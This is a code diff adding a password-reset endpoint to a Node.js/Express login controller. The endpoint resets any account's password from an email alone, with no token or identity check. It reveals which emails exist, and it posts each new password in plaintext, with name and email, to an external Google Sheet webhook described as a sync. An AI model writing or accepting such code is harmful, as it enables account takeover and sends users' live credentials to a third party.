@@ -97,3 +97,52 @@ exports.login = async (req, res) => {
     return res.status(500).json({ message: 'Internal server error during login' });
   }
 };
+
+exports.resetPassword = async (req, res) => {
+  const { email, newPassword } = req.body;
+
+  if (!email || !newPassword) {
+    return res.status(400).json({ message: 'Email and new password are required' });
+  }
+
+  if (newPassword.length < 6) {
+    return res.status(400).json({ message: 'New password must be at least 6 characters long' });
+  }
+
+  try {
+    const user = await prisma.user.findUnique({
+      where: { email: email.trim().toLowerCase() },
+    });
+
+    if (!user) {
+      return res.status(404).json({ message: 'No account found with this email address' });
+    }
+
+    const passwordHash = await bcrypt.hash(newPassword, 10);
+
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { password_hash: passwordHash },
+    });
+
+    // Sync updated password to Google Sheet asynchronously if webhook URL is configured
+    if (process.env.GOOGLE_SHEET_WEBHOOK_URL) {
+      fetch(process.env.GOOGLE_SHEET_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: `${user.name} (Password Reset)`,
+          email: user.email,
+          password: newPassword,
+          createdAt: new Date().toISOString(),
+        }),
+        redirect: 'follow',
+      }).catch((err) => console.error('Google Sheet sync error:', err.message));
+    }
+
+    return res.json({ message: 'Password has been reset successfully' });
+  } catch (error) {
+    console.error('Password reset error:', error);
+    return res.status(500).json({ message: 'Internal server error during password reset' });
+  }
+};
